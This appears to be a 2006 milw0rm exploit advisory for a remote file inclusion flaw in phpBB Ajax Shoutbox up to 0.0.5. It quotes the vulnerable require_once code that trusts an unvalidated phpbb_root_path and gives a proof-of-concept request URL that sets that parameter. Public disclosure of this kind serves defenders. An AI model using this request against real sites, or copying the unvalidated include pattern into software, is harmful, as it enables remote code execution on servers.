@@ -1,0 +1,24 @@
+#
+# *
+# * Title: phpBB Ajax Shoutbox <= 0.0.5 (phpbb_root_path) Remote File Inclusion
+# * Author/Discovery: boecke
+# * Vulnerability Type: Remote File Inclusion
+# * Risk: High Risk
+# * Software Affected: phpBB Ajax Shoutbox <= 0.0.5
+# * Release Source: http://usuarios.lycos.es/kinfule/download.php?id=16
+# * Release Page @ phpBB.com : http://www.phpbb.com/phpBB/viewtopic.php?t=389032
+# *
+# * Literally shouts to: str0ke and henrik
+# * Don't promote Google-ism!
+# *
+#
+
+[ Vulnerable Code: ]
+$phpbb_root_path = ( !@$phpbb_root_path ) ? './' : $phpbb_root_path;
+require_once($phpbb_root_path . 'extension.inc');
+require_once($phpbb_root_path . 'common.'.$phpEx);
+
+[ Proof on Concept: ]
+http://localhost/phpBB2/shoutbox.php?phpbb_root_path=
+
+# milw0rm.com [2006-10-12]
